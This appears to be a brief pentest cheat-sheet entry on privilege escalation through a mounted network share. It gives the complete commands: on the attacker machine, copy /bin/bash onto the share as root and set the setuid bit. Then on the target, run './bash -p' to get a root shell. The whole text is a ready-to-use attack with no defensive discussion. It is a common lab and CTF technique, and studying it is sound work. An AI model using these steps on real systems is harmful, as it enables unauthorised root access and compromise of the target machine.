## Precondition

Share is mounted to a local directory and user has access to the remote computer _(ssh for example)_.

## On local computer/attacker

```
sudo cp /bin/bash <directory>
sudo chmod +s <directory>/bash
```

copy bash to mounted share and allow running the file as the user who created it (_root_).

## On remote computer/target

```
./bash -p
```

run bash as root.
